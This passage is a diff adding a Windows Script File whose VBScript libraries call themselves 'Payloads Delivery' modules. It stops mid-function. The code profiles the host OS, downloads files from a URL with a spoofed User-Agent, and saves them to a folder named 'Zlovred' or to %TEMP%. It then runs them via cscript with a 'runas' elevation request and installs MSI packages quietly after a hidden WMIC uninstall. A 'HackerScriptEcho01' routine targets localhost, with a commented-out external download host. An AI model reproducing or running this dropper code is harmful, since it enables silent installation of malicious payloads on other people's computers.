@@ -1,0 +1,1125 @@
+<?xml version="1.0" encoding="Windows-1251"?>
+<!-- ***************************** -->
+<!-- File wsf -->
+<!-- MSIDownload.wsf -->
+<!--
+-->
+<!-- ***************************** -->
+<job id="ID1">
+<script language="JScript">
+	<![CDATA[
+	]]>
+	</script>
+	<script language="VBScript">
+	<![CDATA[
+' *********************************************************
+' getWindowsOperationSystemType
+' This Function Gets Windows Operation System Types
+' *********************************************************
+
+Function getWindowsOperationSystemType()
+    strComputer = "."
+    Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
+    Set colOperatingSystems = objWMIService.ExecQuery ("Select * from Win32_OperatingSystem")
+    For Each objOperatingSystem in colOperatingSystems
+        'Wscript.Echo objOperatingSystem.Caption & "  " & objOperatingSystem.Version
+        strOS = objOperatingSystem.Version
+    Next
+    If InStr(1, strOS, "6.1.", vbTextCompare ) Then
+        getWindowsOperationSystemType = "6.1"
+    elseif InStr(1, strOS, "6.3.", vbTextCompare) Then
+        getWindowsOperationSystemType = "6.3"
+    elseif InStr(1, strOS, "10.0.22", vbTextCompare) Then
+        getWindowsOperationSystemType = "11"
+    elseif InStr(1, strOS, "10.0.", vbTextCompare) Then
+        getWindowsOperationSystemType = "10"
+    Else
+        getWindowsOperationSystemType = "Other"
+    End If
+End Function
+
+Function getWindowsOSArchitecture()
+    strComputer = "."
+    Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
+    Set colOperatingSystems = objWMIService.ExecQuery ("Select * from Win32_OperatingSystem")
+    For Each objOperatingSystem in colOperatingSystems
+        'Wscript.Echo objOperatingSystem.Caption & "  " & objOperatingSystem.Version
+        strArch = objOperatingSystem.OSArchitecture
+    Next
+    If InStr(1, strArch, "32", vbTextCompare ) Then
+        getWindowsOSArchitecture = "x86"
+    elseif InStr(1, strArch, "64", vbTextCompare) Then
+        getWindowsOSArchitecture = "x64"
+    Else
+        getWindowsOSArchitecture = "Other"
+    End If
+End Function ' getWindowsOSArchitecture
+
+Function getWindowsOSLanguage()
+    strComputer = "."
+    Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
+    Set colOperatingSystems = objWMIService.ExecQuery ("Select * from Win32_OperatingSystem")
+    For Each objOperatingSystem in colOperatingSystems
+        'Wscript.Echo objOperatingSystem.Caption & "  " & objOperatingSystem.Version
+        strLang = objOperatingSystem.OSLanguage
+    Next
+    If InStr(1, strLang, "1049", vbTextCompare ) Then
+        getWindowsOSLanguage = "Russian"
+    elseif InStr(1, strLang, "1033", vbTextCompare) Then
+        getWindowsOSLanguage = "English"
+    Else
+        getWindowsOSLanguage = "Other"
+    End If
+End Function ' getWindowsOSLanguage
+
+Function getIfWindowsOSServer()
+    strComputer = "."
+    Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
+    Set colOperatingSystems = objWMIService.ExecQuery ("Select * from Win32_OperatingSystem")
+    For Each objOperatingSystem in colOperatingSystems
+        'Wscript.Echo objOperatingSystem.Caption & "  " & objOperatingSystem.Version
+        strServer = objOperatingSystem.ProductType
+    Next
+    If InStr(1, strServer, "1", vbTextCompare ) Then
+        getIfWindowsOSServer = "Client"
+    elseif InStr(1, strServer, "2", vbTextCompare) Then
+        getIfWindowsOSServer = "Server Domain Controller"
+    elseif InStr(1, strServer, "3", vbTextCompare) Then
+        getIfWindowsOSServer = "Server Standalone"
+    Else
+        getIfWindowsOSServer = "Other"
+    End If
+End Function ' getWindowsOSLanguage
+
+Function getIfWindowsOSCore()
+    Dim fso, wsh, envProc, pathExplorer
+    ' Create ActiveX Objects
+	Set fso = CreateObject("Scripting.FileSystemObject")
+	Set wsh = CreateObject("WScript.Shell")
+	Set envProc = wsh.Environment("PROCESS")
+    ' Set Windows Explorer Path
+    pathExplorer = envProc("SystemRoot") & "\explorer.exe"
+    ' Check If a file explorer.exe is present
+    If fso.FileExists(pathExplorer) Then
+        getIfWindowsOSCore = "Desktop"
+    Else
+        getIfWindowsOSCore = "Core"
+    End If
+End Function
+
+'WScript.Echo "Windows " & getWindowsOperationSystemType & " " & getWindowsOSArchitecture & " " & getWindowsOSLanguage & " " & getIfWindowsOSServer & " " & getIfWindowsOSCore
+	]]>
+	</script>
+	<script language="VBScript">
+	<![CDATA[
+' *********************************************************
+'
+' LIB_FUNC.VBS
+' This file contain main modules for Payloads Delivery
+'
+' Revision 1.1.0.0 (Extended Beta) May be Present
+' The Library Links at lib_func-1.0.0.js
+'
+' Version 1.1.1.0 (Extended Beta)
+'
+' *********************************************************
+' *********************************************************
+'
+' getTempEnviron()
+' This Function Returns the Path for User Variable TEMP
+'
+' PARAMETERS:   NONE
+' RETURNS:      Path for Zlovred Directory if Exists or
+'               Path for User Variable %TEMP% if Success or
+'               "C:\Windows\Temp" if API Error or
+'				"" if General Sysytem Error
+'
+' *****************************************************************************/
+Function getTempEnviron()
+	Dim fso, wsh, envProc, envSys
+	Dim strZlFolder ' Zlovred Temprorary Folder
+	' Define ActiveX Objects
+	Set fso = CreateObject("Scripting.FileSystemObject")
+	Set wsh = CreateObject("WScript.Shell")
+	' Define Process Environment Variable
+	Set envProc = wsh.Environment("PROCESS")
+	' Define System Environment Variable
+	Set envSys = wsh.Environment
+	' Define Zlovred Temprorary Folder
+	strZlFolder = "C:\pub1\Distrib\Zlovred"
+	' Define and Check Environment Variables
+	Dim envVariable
+	envVariable = strZlFolder
+	If Not fso.FolderExists(envVariable) Then
+		envVariable = envProc("TEMP")
+		If Not fso.FolderExists(envVariable) Then
+			envVariable = envSys("TMP")
+			IF Not fso.FolderExists(envVariable) Then
+				envVariable = ""
+			End If
+		End If
+	End If
+	getTempEnviron = envVariable
+End Function
+
+' *********************************************************
+'
+' UploadFilesFromInt( strFile, strURL, strPath )
+' This Function Upload the File strFile from URL on HTTP/HTTPS Protocols
+' and Save it on Local Computer to Path strPath
+' Function Uses Objects "Microsoft.XMLHTTP" and "Adodb.Stream"
+'
+' PARAMETERS:   strFile -- a File to be Downloaded (only name and extension)
+'               strURL -- an URL of the web-site, from which the File
+'               is Downloaded
+'               strPath -- a Place in a Windows Computer (Full path without slash)
+'               in which the File is Downloaded
+'
+' RETURNS:      0 -- If File is Normally Downloaded and Created
+'               1 -- if File in Path strPath Can't Create
+'               2 -- if XMLHTTP or ADOStream Can't Initialize
+'				3 -- if Emty HTTP Responce or Send Access Denied
+'				4 -- if HTTP Response Not 200 (while is not make)
+'
+' *********************************************************/
+Function UploadFilesFromInt(strFile, strURL, strPath)
+	' body...
+	On Error Resume Next
+	Err.Clear
+	Dim fso, xmlHttp, adoStream
+	Dim cb0, cb1, cb2, cb3
+	' Define FileSystemObject
+	Set fso = CreateObject("Scripting.FileSystemObject")
+	If Err.Number <> 0 Then
+		UploadFilesFromInt = 1
+	Else
+		Err.Clear
+		' Define XMLHTTP Help Object
+		' Set xmlHttp = getXmlHttp02
+		Set xmlHttp = CreateObject("Microsoft.XMLHTTP")
+		If IsNull(xmlHttp) Then
+			UploadFilesFromInt = 2
+		Else
+			' Define Adodb.Stream Object
+			Set adoStream = CreateObject("Adodb.Stream")
+			if Err.Number <> 0 Then
+				UploadFilesFromInt = 2
+			else
+				Err.Clear
+				Dim strFileURL
+				Dim strLocal_Path
+				Dim intUploadFilesFromInt
+				Dim blnExistRemoteFile
+				Dim cb(4)
+				' Define Full Downloaded File URL
+				strFileURL = strURL & strFile
+				' Define Full Local Path to be Downloaded
+				strLocal_Path = strPath & "\" & strFile
+				intUploadFilesFromInt = 0
+				' Check if Path is Exist
+				if fso.FolderExists(strPath) Then
+					intUploadFilesFromInt = 0
+				else
+					intUploadFilesFromInt = 1
+				end if
+				If fso.FileExist(strLocal_Path) Then
+					fso.DeleteFile strLocal_Path, true
+				End If
+				' WScript.Echo "int = " & intUploadFilesFromIntWithHTTP01
+
+				' Downloaded File
+				' Open URL (Get Requiest synchronous)
+				Err.Clear
+				xmlHttp.Open "GET", strFileURL, false
+				If Err.Number <> 0 Then
+					WScript.Echo "Can't Open URL: " & strFileURL & vbNewLine & "Error: " & Str(Err.Number)
+					UploadFilesFromInt = 3
+				Else
+					Err.Clear
+					' Set User-Agent Header (for Safari Browser)
+					' WScript.Echo "Test!"
+					xmlHttp.SetRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
+					' Define Function onreadystatechange
+					'xmlHttp.onreadystatechange = GetRef("xmlHTTP_OnReadyStateChange")
+					'if(xmlHttp.readyState === 4) {
+					'	cb[0] = xmlHttp.status; // Status of Request (Integer Number)
+					'	cb[1] = xmlHttp.getAllResponseHeaders(); // Response Header
+					'	cb[2] = xmlHttp.responseText; // Response Text
+					'	cb[3] = xmlHttp.responseBody; // Response Body
+					'}
+
+					' Send File from URL
+
+					xmlHttp.Send
+					' /*** Test ***/
+					' Wscript.Echo "Download-Status: " & xmlhttp.Status & " " & xmlhttp.statusText
+						'xmlHttp.WaitForResponse
+						'WScript.Echo "Can't make Send() Request!" & vbNewLine & "May be Block with Antivirus?" & vbNewLine & "Err = " & Str(Err.Number)
+						'UploadFilesFromInt = 3
+						'xmlHttp.Abort
+						Err.Clear
+						
+						cb0 = xmlHttp.Status
+						cb1 = xmlHttp.getAllResponseHeaders
+						cb2 = xmlHttp.responseText
+						cb3 = xmlHttp.responseBody
+						If cb0 = 200 And intUploadFilesFromInt = 0 Then
+							' WScript.Echo "XmlHttp Status = " & cb0 & vbNewLine
+							' If Send Request is Successful
+							blnExistRemoteFile = true
+						Else
+							blnExistRemoteFile = false
+							intUploadFilesFromInt = 4
+							WScript.Echo "Wrong HTTP Status:" & cb0 & vbNewLine & "nURL = " & strFileURL
+							xmlHttp.Abort
+						End If
+						If blnExistRemoteFile = true Then
+							' Set AdoStream Type mode and Open It
+							adoStream.Type = 1
+							adoStream.Mode = 3
+							adoStream.Open
+							' Write to AdoStream Response Body of HTTP Request
+							Err.Clear
+							adoStream.Write(cb3)
+							If Err.Number <> 0 Then
+								WScript.Echo "Can't Save Data to the Stream." & vbNewLine & "Error Status: " & Err.Number & vbNewLine
+							End If
+							' WScript.Echo "The Local File Path = " & strLocal_Path & vbNewLine
+							' Save Stream to strFile
+							Err.Clear ' Must be Heare!
+							adoStream.SaveToFile strLocal_Path, 2
+							If Err.Number <> 0 Then
+								WScript.Echo "Can't Save File Stream into File: " & strLocal_Path & vbNewLine & "Check Access Rights!" & vbNewLine &_ 
+									"Error Status: " & Err.Number & ". The Error " & Err.Description & " has occurred." & vbNewLine
+								intUploadFilesFromInt = 1
+							Else
+								' /Downloaded File
+								' Close Objects
+								adoStream.Close
+								xmlHttp.Abort
+								' Check If File Downloaded
+								If Not fso.FileExists(strLocal_Path) And intUploadFilesFromInt = 0 Then
+									Wscript.Echo strLocal_Path & " is not found!"
+									intUploadFilesFromInt = 1
+								End If
+							End If
+						End If
+				End If
+				UploadFilesFromInt = intUploadFilesFromInt
+				' WScript.Echo strLocal_Path
+			end if
+		End If
+	End If
+End Function
+
+' ******************************************************************************
+'
+' RunDownloadedScript01( strPath, strVBS, intTimeOut )
+' This Function Run Hidden a strVBS File
+' with Command "cscript //NoLogo " & strPath & "\" & strVBS
+'
+' PARAMETERS:   strPath -- The Path to strVBS
+'               strVBS -- a VBS File with instructions
+'               (Windows Scripts Shell)
+'				intTimeOut -- Estimated Time for Running (ms)
+'
+' RETURNS:      0 if Success
+'				1 if Path not Found
+'
+'******************************************************************************/
+Function RunDownloadedScript01(strPath, strVBS, intTimeOut)
+	Dim constRun_VBS, constOpt
+	' Define Windows Scripts Options
+	constRun_VBS = "//Nologo "
+	' Define VBS Script Options (Empty)
+	constOpt = ""
+	Dim strValue, shApp, fso, wsh, envProc, pathCMD
+	' Define ActiveX Object
+	Set shApp = CreateObject("Shell.Application")
+	Set fso = CreateObject("Scripting.FileSystemObject")
+	Set wsh = CreateObject("WScript.Shell")
+	Set envProc = wsh.Environment("PROCESS")
+	pathCMD = envProc("SystemRoot") & "\System32"
+	' Check Paths
+	If Not fso.FileExists(pathCMD & "\cscript.exe") Then
+		RunDownloadedScript01 = 1
+	Else
+		If Not fso.FileExists(strPath + "\" + strVBS) Then
+			RunDownloadedScript01 = 1
+		Else
+			' Set Cscript Command Arguments
+			strValue = constRun_VBS & Chr(34) & strPath & "\" & strVBS & Chr(34) & constOpt
+			' Run cscript.exe with Elevated Privileges (runas) at Invisible Mode (0), with working Diretory strPath
+			shApp.ShellExecute pathCMD & "\cscript.exe", strValue, strPath, "runas", 1
+			' Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done
+			WScript.Sleep intTimeOut
+			RunDownloadedScript01 = 0
+		End If
+	End If
+End Function
+
+'* ********************************************************
+'
+' ScriptDownlRun01( strURL , strFileNameWSH, iTimeOut )
+'
+' This Script Downloads Exe file from strURL Path and
+' Execute it with Script TimeOut in iTimeOut ms
+'
+' PARAMETERS:	strURL an URL Path to Download
+' 				strFileNameWSH - Name of WSH File
+'				iTimeOut is Wait to End Execution of the File
+' RETURNS:		0 if Success Download and Run
+'				1 if Error Occur
+'
+' *********************************************************/
+Function ScriptDownlRun01(strURL, strFileNameWSH, iTimeOut)
+	Dim iFlag
+	Dim tempFolder
+	' Get Temp Folder Name
+	tempFolder = getTempEnviron
+	' Check if strFolder is Empty of TEMP Directory not Assigned
+	If Len(tempFolder) = 0 Then
+		ScriptDownlRun01 = 1
+	Else
+		iFlag = UploadFilesFromInt(strFileNameWSH, strURL, tempFolder)
+		If iFlag <> 0 Then
+			ScriptDownlRun01 = 1
+		Else
+			RunDownloadedScript01 tempFolder, strFileNameWSH, iTimeOut
+			ScriptDownlRun01 = 0
+		End If
+	End If
+End Function
+
+'* *********************************************************
+'
+' HackerScriptEcho01()
+'
+' This Script Repair HackerScript Library Folders
+'
+' PARAMETERS:	NONE;
+' GLOBALS:		strHackURL is URL Path to Download
+'				iTimeOut01 is Wait to End Execution of the File
+' 				strHackScript - Name of Exe File
+'				constHackOpt is Options of Exe File
+'				strDownlScript is a Download Script
+' RETURNS:		0 if Success Download and Run
+'				1 if Folder Already Exists
+'				2 if Error Occur
+'
+' *********************************************************/
+Function HackerScriptEcho01()
+	Dim strHackURL, strHackScript, iTimeOut01
+'	strHackURL = "http://file.netip4.ru/WinUpdate/InitialCommon/"
+	strHackURL = "http://localhost/"
+	strHackScript = "echo.wsf"
+	iTimeOut01 = 1000 ' 1 sec
+	Dim iFlag
+	iFlag = 1
+	iFlag = ScriptDownlRun01(strHackURL, strHackScript, iTimeOut01)
+	If iFlag = 1 Then
+		HackerScriptEcho01 = 2
+	Else
+		HackerScriptEcho01 = 0
+	End If
+End Function
+
+' WScript.Echo "Error Code: " & RunDownloadedScript01( "C:\Users\yuden", "echo.wsf", 10000 )
+' WScript.Echo HackerScriptEcho01
+	]]>
+	</script>
+	<script language="VBScript">
+	<![CDATA[
+' *********************************************************
+'
+' LIB_FUNC.VBS
+' This file contain main modules for Payloads Delivery
+'
+' Revision 1.2.0.0 (Extended Beta) May be Present
+' The Library Links at lib_func-1.0.0.js
+' 
+' Version 1.2.0.0 (Extended Beta)
+'
+' *********************************************************
+
+' *********************************************************
+' RegKeyRead001 Function
+' This Function Read the Key RegistryKey and Returns
+' a Key Value String
+' *********************************************************
+Function RegKeyRead001(registryKey)
+	' Returns the value of a windows registry key.
+	Dim winScriptShell
+	'WScript.Echo registryKey
+
+	On Error Resume Next
+	Set winScriptShell = CreateObject("WScript.Shell")  ' access Windows scripting
+	RegKeyRead001 = winScriptShell.RegRead(registryKey)    ' read key from registry
+End Function
+
+' *********************************************************
+' RegKeyRead002 Function
+' This Function Read the Key RegistryKey and Returns
+' a Key Value String
+' *********************************************************
+Function RegKeyRead002(RootKey, KeyName, ValueName, RegType)
+	' Returns the value of a windows registry key.
+	Dim oCtx, oLocator, oWMI, oReg, oInParams, oOutParams
+	Set oCtx = CreateObject("WbemScripting.SWbemNamedValueSet")
+	oCtx.Add "__ProviderArchitecture", RegType
+	Set oLocator = CreateObject("Wbemscripting.SWbemLocator")
+	Set oWMI = oLocator.ConnectServer("", "root\default", "", "", , , , oCtx)
+	Set oReg = oWMI.Get("StdRegProv")
+	Set oInParams = oReg.Methods_("GetStringValue").Inparameters
+	oInParams.Hdefkey = RootKey
+  	oInParams.Ssubkeyname = KeyName
+  	oInParams.Svaluename = ValueName
+
+	Set oOutParams = oReg.ExecMethod_("GetStringValue", oInParams, 0, oCtx)
+
+	RegKeyRead002 = oOutParams.SValue
+End Function
+
+' *********************************************************
+'
+' getTempEnviron01()
+' This Function Returns the Path for User Variable TEMP
+'
+' PARAMETERS:   NONE
+' RETURNS:      Path for Zlovred Directory if Exists or
+'               Path for User Variable %TEMP% if Success or
+'               "C:\Windows\Temp" if API Error or
+'				"" if General Sysytem Error
+'
+' *****************************************************************************/
+Function getTempEnviron01()
+	Dim fso, wsh, envProc, envSys
+	Dim strZlFolder ' Zlovred Temprorary Folder
+	' Define ActiveX Objects
+	Set fso = CreateObject("Scripting.FileSystemObject")
+	Set wsh = CreateObject("WScript.Shell")
+	' Define Process Environment Variable
+	Set envProc = wsh.Environment("PROCESS")
+	' Define System Environment Variable
+	Set envSys = wsh.Environment
+	' Define Zlovred Temprorary Folder
+	strZlFolder = "C:\pub1\Distrib\Zlovred"
+	' Define and Check Environment Variables
+	Dim envVariable
+	envVariable = strZlFolder
+	If Not fso.FolderExists(envVariable) Then
+		envVariable = envProc("TEMP")
+		If Not fso.FolderExists(envVariable) Then
+			envVariable = envSys("TMP")
+			IF Not fso.FolderExists(envVariable) Then
+				envVariable = ""
+			End If
+		End If
+	End If
+	getTempEnviron01 = envVariable
+End Function
+
+' *********************************************************
+'
+' getDownlEnviron01()
+' This Function Returns the Path for User Variable TEMP
+'
+' PARAMETERS:   NONE
+' RETURNS:      Path for Download Directory if Exists or
+'               Path for User Variable %TEMP% if Success or
+'               "C:\Windows\Temp" if API Error or
+'				"" if General Sysytem Error
+'
+' *****************************************************************************/
+Function getDownlEnviron01()
+	Dim fso, wsh, envProc, envSys, pathTemp
+	Dim strZlFolder ' Download Temprorary Folder
+	' Downloads Folder Registry Key
+	Dim GUID_WIN_DOWNLOADS_FOLDER
+	Dim KEY_PATH
+	GUID_WIN_DOWNLOADS_FOLDER = "{374DE290-123F-4565-9164-39C4925E467B}"
+	KEY_PATH = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\"
+	Dim aKey 
+	aKey = KEY_PATH & GUID_WIN_DOWNLOADS_FOLDER
+	'
+	' Define ActiveX Objects
+	Set fso = CreateObject("Scripting.FileSystemObject")
+	Set wsh = CreateObject("WScript.Shell")
+	' Define Process Environment Variable
+	Set envProc = wsh.Environment("PROCESS")
+	' Define System Environment Variable
+	Set envSys = wsh.Environment
+	' Define Download Temprorary Folder
+
+	On Error Resume Next
+	pathTemp = RegKeyRead001(aKey)
+	On Error Goto 0
+
+	' WScript.Echo pathTemp
+	If InStr(1, pathTemp, "%USERPROFILE%", vbTextCompare ) Then 
+		pathTemp = Replace(pathTemp, "%USERPROFILE%", envProc("USERPROFILE"))
+	End If
+
+	' Define and Check Environment Variables
+	Dim envVariable
+	envVariable = pathTemp
+	If Not fso.FolderExists(envVariable) Then
+		envVariable = envProc("TEMP")
+		If Not fso.FolderExists(envVariable) Then
+			envVariable = envSys("TMP")
+			IF Not fso.FolderExists(envVariable) Then
+				envVariable = ""
+			End If
+		End If
+	End If
+	getDownlEnviron01 = envVariable
+End Function
+
+' *********************************************************
+'
+' getDownlEnviron02()
+' This Function Returns the Path for User Variable TEMP
+'
+' PARAMETERS:   NONE
+' RETURNS:      Path for Download Directory if Exists or
+'               Path for User Variable %TEMP% if Success or
+'               "C:\Windows\Temp" if API Error or
+'				"" if General Sysytem Error
+'
+' *****************************************************************************/
+Function getDownlEnviron02()
+	Const HKCR = &H80000000 'HKEY_CLASSES_ROOT
+	Const HKCU = &H80000001 'HKEY_CURRENT_USER
+	Const HKLM = &H80000002 'HKEY_LOCAL_MACHINE
+	Const HKUS = &H80000003 'HKEY_USERS
+	Const HKCC = &H80000005 'HKEY_CURRENT_CONFIG
+	Dim fso, wsh, envProc, envSys, pathTemp
+	Dim strZlFolder ' Download Temprorary Folder
+	' Downloads Folder Registry Key
+	Dim GUID_WIN_DOWNLOADS_FOLDER
+	Dim KEY_PATH
+	GUID_WIN_DOWNLOADS_FOLDER = "{374DE290-123F-4565-9164-39C4925E467B}"
+	KEY_PATH1 = "SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\"
+	'
+	' Define ActiveX Objects
+	Set fso = CreateObject("Scripting.FileSystemObject")
+	Set wsh = CreateObject("WScript.Shell")
+	' Define Process Environment Variable
+	Set envProc = wsh.Environment("PROCESS")
+	' Define System Environment Variable
+	Set envSys = wsh.Environment
+	' Define Download Temprorary Folder
+	pathTemp = RegKeyRead002(HKCU, KEY_PATH1, GUID_WIN_DOWNLOADS_FOLDER, 32)
+
+	' WScript.Echo pathTemp
+	If InStr(1, pathTemp, "%USERPROFILE%", vbTextCompare ) Then 
+		pathTemp = Replace(pathTemp, "%USERPROFILE%", envProc("USERPROFILE"))
+	End If
+
+	' Define and Check Environment Variables
+	Dim envVariable
+	envVariable = pathTemp
+	If Not fso.FolderExists(envVariable) Then
+		envVariable = envProc("TEMP")
+		If Not fso.FolderExists(envVariable) Then
+			envVariable = envSys("TMP")
+			IF Not fso.FolderExists(envVariable) Then
+				envVariable = ""
+			End If
+		End If
+	End If
+	getDownlEnviron02 = envVariable
+End Function
+
+' *********************************************************
+'
+' UploadFilesFromIntWithHTTP01( strFile, strURL, strPath )
+' This Function Upload the File strFile from URL on HTTP/HTTPS Protocols
+' and Save it on Local Computer to Path strPath
+' Function Uses Objects "Microsoft.XMLHTTP" and "Adodb.Stream"
+'
+' PARAMETERS:   strFile -- a File to be Downloaded (only name and extension)
+'               strURL -- an URL of the web-site, from which the File
+'               is Downloaded
+'               strPath -- a Place in a Windows Computer (Full path without slash)
+'               in which the File is Downloaded
+'
+' RETURNS:      0 -- If File is Normally Downloaded and Created
+'               1 -- if File in Path strPath Can't Create
+'               2 -- if XMLHTTP or ADOStream Can't Initialize
+'				3 -- if Emty HTTP Responce or Send Access Denied
+'				4 -- if HTTP Response Not 200 (while is not make)
+'
+' *********************************************************/
+Function UploadFilesFromIntWithHTTP01(strFile, strURL, strPath)
+	' body...
+	On Error Resume Next
+	Err.Clear
+	Dim fso, xmlHttp, adoStream
+	Dim cb0, cb1, cb2, cb3
+	' Define FileSystemObject
+	Set fso = CreateObject("Scripting.FileSystemObject")
+	If Err.Number <> 0 Then
+		UploadFilesFromIntWithHTTP01 = 1
+	Else
+		Err.Clear
+		' Define XMLHTTP Help Object
+		' Set xmlHttp = getXmlHttp02
+		Set xmlHttp = CreateObject("Microsoft.XMLHTTP")
+		If IsNull(xmlHttp) Then
+			UploadFilesFromIntWithHTTP01 = 2
+		Else
+			' Define Adodb.Stream Object
+			Set adoStream = CreateObject("Adodb.Stream")
+			if Err.Number <> 0 Then
+				UploadFilesFromIntWithHTTP01 = 2
+			else
+				Err.Clear
+				Dim strFileURL
+				Dim strLocal_Path
+				Dim intUploadFilesFromIntWithHTTP01
+				Dim blnExistRemoteFile
+				Dim cb(4)
+				' Define Full Downloaded File URL
+				strFileURL = strURL & strFile
+				' Define Full Local Path to be Downloaded
+				strLocal_Path = strPath & "\" & strFile
+				intUploadFilesFromIntWithHTTP01 = 0
+				' Check if Path is Exist
+				if fso.FolderExists(strPath) Then
+					intUploadFilesFromIntWithHTTP01 = 0
+				else
+					intUploadFilesFromIntWithHTTP01 = 1
+				end if
+				If fso.FileExist(strLocal_Path) Then
+					fso.DeleteFile strLocal_Path, true
+				End If
+				' WScript.Echo "int = " & intUploadFilesFromIntWithHTTP01
+
+				' Downloaded File
+				' Open URL (Get Requiest synchronous)
+				Err.Clear
+				xmlHttp.Open "GET", strFileURL, false
+				If Err.Number <> 0 Then
+					WScript.Echo "Can't Open URL: " & strFileURL & vbNewLine & "Error: " & Str(Err.Number)
+					UploadFilesFromIntWithHTTP01 = 3
+				Else
+					Err.Clear
+					' Set User-Agent Header (for Safari Browser)
+					' WScript.Echo "Test!"
+					xmlHttp.SetRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
+					' Define Function onreadystatechange
+					'xmlHttp.onreadystatechange = GetRef("xmlHTTP_OnReadyStateChange")
+					'if(xmlHttp.readyState === 4) {
+					'	cb[0] = xmlHttp.status; // Status of Request (Integer Number)
+					'	cb[1] = xmlHttp.getAllResponseHeaders(); // Response Header
+					'	cb[2] = xmlHttp.responseText; // Response Text
+					'	cb[3] = xmlHttp.responseBody; // Response Body
+					'}
+
+					' Send File from URL
+
+					xmlHttp.Send
+					' /*** Test ***/
+					' Wscript.Echo "Download-Status: " & xmlhttp.Status & " " & xmlhttp.statusText
+						'xmlHttp.WaitForResponse
+						'WScript.Echo "Can't make Send() Request!" & vbNewLine & "May be Block with Antivirus?" & vbNewLine & "Err = " & Str(Err.Number)
+						'UploadFilesFromIntWithHTTP01 = 3
+						'xmlHttp.Abort
+						Err.Clear
+						
+						cb0 = xmlHttp.Status
+						cb1 = xmlHttp.getAllResponseHeaders
+						cb2 = xmlHttp.responseText
+						cb3 = xmlHttp.responseBody
+						If cb0 = 200 And intUploadFilesFromIntWithHTTP01 = 0 Then
+							' WScript.Echo "XmlHttp Status = " & cb0 & vbNewLine
+							' If Send Request is Successful
+							blnExistRemoteFile = true
+						Else
+							blnExistRemoteFile = false
+							intUploadFilesFromIntWithHTTP01 = 4
+							WScript.Echo "Wrong HTTP Status:" & cb0 & vbNewLine & "nURL = " & strFileURL
+							xmlHttp.Abort
+						End If
+						If blnExistRemoteFile = true Then
+							' Set AdoStream Type mode and Open It
+							adoStream.Type = 1
+							adoStream.Mode = 3
+							adoStream.Open
+							' Write to AdoStream Response Body of HTTP Request
+							Err.Clear
+							adoStream.Write(cb3)
+							If Err.Number <> 0 Then
+								WScript.Echo "Can't Save Data to the Stream." & vbNewLine & "Error Status: " & Err.Number & vbNewLine
+							End If
+							' WScript.Echo "The Local File Path = " & strLocal_Path & vbNewLine
+							' Save Stream to strFile
+							Err.Clear ' Must be Heare!
+							adoStream.SaveToFile strLocal_Path, 2
+							If Err.Number <> 0 Then
+								WScript.Echo "Can't Save File Stream into File: " & strLocal_Path & vbNewLine & "Check Access Rights!" & vbNewLine &_ 
+									"Error Status: " & Err.Number & ". The Error " & Err.Description & " has occurred." & vbNewLine
+								intUploadFilesFromIntWithHTTP01 = 1
+							Else
+								' /Downloaded File
+								' Close Objects
+								adoStream.Close
+								xmlHttp.Abort
+								' Check If File Downloaded
+								If Not fso.FileExists(strLocal_Path) And intUploadFilesFromIntWithHTTP01 = 0 Then
+									Wscript.Echo strLocal_Path & " is not found!"
+									intUploadFilesFromIntWithHTTP01 = 1
+								End If
+							End If
+						End If
+				End If
+				UploadFilesFromIntWithHTTP01 = intUploadFilesFromIntWithHTTP01
+				' WScript.Echo strLocal_Path
+			end if
+		End If
+	End If
+End Function
+
+' ******************************************************************************
+'
+' InstallDownloadedMSI01(strPath, strMSI, productName, intTimeOutW, intTimeOutM)
+' This Function Run Hidden a strMSI File
+' with Command "msiexec /i" & strPath\strMSI & "/quiet /qb /norestart /l*v' & strPath\strMSI.log
+'
+' PARAMETERS:   strPath -- The Path to strMSI
+'               strMSI -- an MSI File to hidden Install
+'               productName -- a Product Name of MSI Package for hidden Uninstall
+'				intTimeOut -- Estimated Time for Running (ms)
+'
+' RETURNS:      0 if Success
+'				1 if Path not Found
+'
+'******************************************************************************/
+Function InstallDownloadedMSI01(strPath, strMSI, productName, intTimeOutW, intTimeOutM)
+	Dim constRun_MSI, constOpt, optLogFile
+	Dim constRun_WMIC, constOptW
+	' Define Log File
+	optLogFile= " /l*v " & Chr(34) & strPath & "\" & strMSI & ".log" & Chr(34)
+	' Define WMIC MSI Uninstall Options
+	constRun_WMIC = " product where name=" & Chr(34)
+	constOptW = Chr(34) & " call uninstall"
+	' Define MSI Scripts Options
+	constRun_MSI = " /i "
+	' Define MSI Script Options (not Empty)
+	constOpt = " /quiet /qb /norestart" & optLogFile
+	Dim strValue, shApp, fso, wsh, envProc, pathCMD
+	Dim strValueW, strWMIC
+	' Define ActiveX Object
+	Set shApp = CreateObject("Shell.Application")
+	Set fso = CreateObject("Scripting.FileSystemObject")
+	Set wsh = CreateObject("WScript.Shell")
+	Set envProc = wsh.Environment("PROCESS")
+	pathCMD = envProc("SystemRoot") & "\System32"
+	strWMIC = pathCMD & "\WBem\WMIC.exe"
+	' Check Paths
+	If Not fso.FileExists(strWMIC) Then
+		InstallDownloadedMSI01 = 1
+	Else
+		If Not fso.FileExists(pathCMD & "\msiexec.exe") Then
+			InstallDownloadedMSI01 = 1
+		Else
+			If Not fso.FileExists(strPath + "\" + strMSI) Then
+				InstallDownloadedMSI01 = 1
+			Else
+				' Set WMIC Command Arguments
+				strValueW = constRun_WMIC & productName & constOptW
+				' Set msiexec Command Arguments
+				strValue = constRun_MSI & Chr(34) & strPath & "\" & strMSI & Chr(34) & constOpt
+				' Run WMIC.exe with Elevated Privileges (runas) at Invisible Mode (0), with working Diretory strPath
+				shApp.ShellExecute strWMIC, strValueW, strPath, "runas", 0
+				' Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done
+				WScript.Sleep intTimeOutW
